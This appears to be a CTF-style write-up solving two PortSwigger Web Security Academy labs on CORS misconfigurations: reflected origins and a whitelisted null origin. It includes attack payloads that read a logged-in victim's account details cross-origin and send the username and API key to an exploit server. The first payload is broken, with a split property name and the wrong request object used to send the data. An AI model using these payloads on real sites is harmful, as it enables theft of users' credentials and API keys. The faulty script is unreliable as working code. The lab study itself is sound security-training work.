## Labs Covered

This write-up focuses on the following **APPRENTICE-level labs** from the PortSwigger Web Security Academy related to **Cross-origin resource sharing (CORS)**:

**CORS vulnerability with basic origin reflection**  
This lab demonstrates how an application reflects the Origin header insecurely, leading to CORS misconfigurations.

**CORS vulnerability with trusted null origin**  
This lab shows how trusting the null origin can lead to CORS vulnerabilities that attackers can exploit.

---

### LAB 1 - CORS vulnerability with basic origin reflection

### Lab Description

![image](https://github.com/user-attachments/assets/96267130-cd65-47b6-957c-ccb94fa0d2ab)

### Solution


The target application is an online shop. After logging in with the provided credentials, 

![image](https://github.com/user-attachments/assets/6d9ac2fc-17f1-426f-a368-fc38d86fc079)


I navigated to the "My Account" section. Using Burp Suite, I observed that the `/my-account` page makes an internal request to `/accountDetails` to retrieve the API key for the user "wiener".


![image](https://github.com/user-attachments/assets/9483b6e7-9474-4f9c-a685-5781015b1d6f)

The HTTP response from this endpoint includes the following header:

```
Access-Control-Allow-Credentials: true
```

![image](https://github.com/user-attachments/assets/4143d0b1-aff8-4197-bfcc-ced84f4a45b5)

This suggests that the server may allow cross-origin requests using credentials (e.g., cookies). I then modified the `Origin` header in a request to `/accountDetails` and tested it using a domain such as `evil.me` (instead of the actual origin).

The server **reflected the origin value** inside the `Access-Control-Allow-Origin` header:

```
Access-Control-Allow-Origin: evil.me
Access-Control-Allow-Credentials: true
```

![image](https://github.com/user-attachments/assets/a168070b-bd01-4e2e-ad89-8c692433c863)


This behavior indicates a **CORS misconfiguration** — the server accepts and reflects arbitrary origins while allowing credentials. This can be exploited to access sensitive data cross-origin using JavaScript.

---

### Exploitation Plan

The exploit script performs the following steps:

1. Sends a cross-origin request to the `/accountDetails` endpoint using `XMLHttpRequest`.
2. Parses the API key and username from the JSON response.
3. Sends the exfiltrated data to an attacker-controlled server (e.g., the exploit server).


---

### JavaScript Payload (Deployed on Exploit Server)

```javascript
<script>
var r = new XMLHttpRequest();
r.open('get', 'https://ac751fb51e9a30b8c0e42a370085005c.web-security-academy.net/accountDetails', false);
r.withCredentials = true;
r.send();
const obj = JSON.parse(r.response Text);
var r2 = new XMLHttpRequest();
r.open('get', 'https://exploit-ac331fea1e9c3019c02f2a21017000ad.web-security-academy.net/?user=' + obj.username + '&apikey=' + obj.apikey, false)
r.send();
</script>
```

![image](https://github.com/user-attachments/assets/81a15706-5ca0-43de-aaf3-acd1d1f8c7b4)


---

### Results

After delivering the payload to the victim (via the exploit server), the browser automatically made a cross-origin request to `/accountDetails`, and the data was exfiltrated to the attacker’s server. This includes:

* `username`
* `apikey`

![image](https://github.com/user-attachments/assets/91c2558a-450f-4f20-8a85-876bb3fef621)

The lab is successfully solved once the stolen API key is logged.

![image](https://github.com/user-attachments/assets/63d6a6b0-e428-40b7-8e96-5aa446a5f611)

---


---

### LAB 2 - CORS vulnerability with trusted null origin

### Lab Description

![image](https://github.com/user-attachments/assets/db4fc35d-f78f-4249-8f57-a03b625def45)

### Solution


## Overview: CORS Exploitation via `null` Origin Whitelist

Cross-Origin Resource Sharing (CORS) is enforced through specific HTTP headers to control access across different origins. Applications that misconfigure these headers—especially by whitelisting insecure origins like `null`—can expose themselves to serious security vulnerabilities.

---

## Common Origin Header Misconfigurations

### 1. Subdomain Matching Errors

Applications that attempt to whitelist domains ending or beginning with a specific string can introduce security gaps if proper boundary checks are not enforced.

**Example:**
If the application intends to allow:

```
normal-website.com
```

Then the following attacker-controlled domains could bypass this check:

* `hacknormal-website.com` *(ends with allowed string)*
* `normal-website.com.evil-user.net` *(starts with allowed string)*

These origin-matching implementations are flawed if they rely on `string.contains()` or similar logic rather than strict origin comparison.

---

### 2. Whitelisting the `null` Origin

The `Origin: null` header is used in several edge-case scenarios, including:

* Requests from **sandboxed iframes**
* **Local file://** origins
* Some **PDF viewers**
* **Data URIs** (`data:text/html,...`)
* **Legacy browser behavior**

If an application explicitly allows `null` in the `Access-Control-Allow-Origin` header, it becomes vulnerable to cross-origin attacks from these non-standard origins.

**Example Request:**

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: null
```

**Vulnerable Response:**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

This indicates the application **trusts the `null` origin**, and credentials (e.g., cookies) can be sent along with the request.

---

## Solution Walkthrough

### 1. Login and Observation

Log in using:

```
Username: wiener
Password: peter
```

![image](https://github.com/user-attachments/assets/a57662d4-fbac-43d1-b139-9319a90047ad)


Then, navigate to the **"My Account"** page.

Inspecting the request to `/accountDetails` reveals that:

* The response contains the header `Access-Control-Allow-Credentials: true`
* The `Access-Control-Allow-Origin` header is **not present by default**

![image](https://github.com/user-attachments/assets/16f78130-dc0c-4c58-9c90-62c0bf634d26)


Modifying the request with a fake origin (e.g., `evil.com`) does not trigger a response header. However, using:

```
Origin: null
```

Returns:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

This confirms that **`null` is whitelisted**.

![image](https://github.com/user-attachments/assets/8d5c8b3e-2dae-448c-9e92-2491dd20c12a)

---

### 2. Exploit via Sandboxed `iframe`

Since sandboxed iframes can trigger a `null` origin, we embed our payload in an `iframe` using the `sandbox` attribute.

**Exploit Payload:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location = 'https://exploit-your_id.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://vulnerable-website.com/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>
"></iframe>
```

![image](https://github.com/user-attachments/assets/06cb9ce7-6179-4685-8c88-7e0c90b580e8)


> Replace the endpoint URLs as appropriate for the lab environment.

Once the payload is delivered to the victim, access the **Access Log** on your exploit server.

![image](https://github.com/user-attachments/assets/f9f28bf3-5ecb-4d8b-adb1-86c7b655cba7)


Submit the API key of administrator to solve the lab.

![image](https://github.com/user-attachments/assets/5cecbb8e-452a-4f28-89b0-484ddafb2298)

```

---


